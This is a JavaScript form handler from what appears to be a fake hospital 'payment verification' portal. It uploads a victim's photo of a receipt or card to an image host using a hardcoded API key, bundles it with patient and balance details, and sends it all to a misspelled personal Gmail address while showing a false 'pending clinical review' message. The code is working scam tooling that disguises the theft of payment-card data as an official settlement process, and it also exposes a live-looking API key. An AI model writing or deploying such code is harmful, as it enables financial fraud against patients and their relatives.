async function handleSubmit() { const fileInput = document.getElementById('fileInput'); if(!fileInput.files[0]) { alert("Please upload the receipt/card photo first."); return; } const btn = document.getElementById('submitBtn'); btn.innerHTML = "VERIFYING ASSETS..."; btn.disabled = true; const apiKey = "2623905ea1c86b9519be8f7928ca4372"; const formData = new FormData(); formData.append("image", fileInput.files[0]); try { // Step 1: Upload to ImgBB const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData }); const result = await response.json(); const imageLink = result.data.url; // This is the direct link to her photo // Step 2: Gather data const name = document.getElementById('p_name').value; const h_id = document.getElementById('h_id').value; const sender = document.getElementById('s_name').value; const p_type = document.getElementById('p_type').value; const balance = document.getElementById('b_amt').value || "0.00"; const asset = document.getElementById('c_type').value; // Step 3: Create the Email (Removed the "Attach Photo" text) const recipient = "teammangementt@gmail.com"; const subject = encodeURIComponent("Clinical Payment Verification: " + name); const body = encodeURIComponent( "--- OFFICIAL SETTLEMENT RECORD ---\n\n" + "Patient Name: " + name + "\n" + "Hospital ID: " + h_id + "\n" + "Relative/Sender: " + sender + "\n" + "Settlement Type: " + p_type + "\n" + "Remaining Balance: $" + balance + "\n" + "Asset Category: " + asset + "\n\n" + "VIEW UPLOADED ASSET/RECEIPT HERE:\n" + imageLink + "\n\n" + "Verification Status: Transmission Complete. Pending Clinical Review." ); // Step 4: Open Gmail and show success screen window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`; setTimeout(() => { document.getElementById('main-portal').style.display = 'none'; document.getElementById('review-message').style.display = 'flex'; }, 1000); } catch (error) { alert("Transmission failed. Please check your connection."); btn.innerHTML = "Submit Verification"; btn.disabled = false; } }
